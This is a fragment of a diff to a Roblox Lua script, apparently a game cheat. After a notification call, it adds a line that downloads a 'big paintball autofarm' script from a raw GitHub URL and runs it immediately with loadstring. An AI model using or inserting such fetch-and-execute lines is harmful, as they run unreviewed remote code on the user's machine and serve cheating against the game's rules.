@@ -6,3 +6,4 @@ Notification:Notify(
     {OutlineColor = Color3.fromRGB(255,255,255),Time = 5, Type = "image"},
     {Image = "http://www.roblox.com/asset/?id=11478378840", ImageColor = Color3.fromRGB(255, 255, 255)}
 )
+loadstring(Game:HttpGet('https://raw.githubusercontent.com/123456789qwerty0/DarkHub/main/big%20paintball%20autofarm'))()
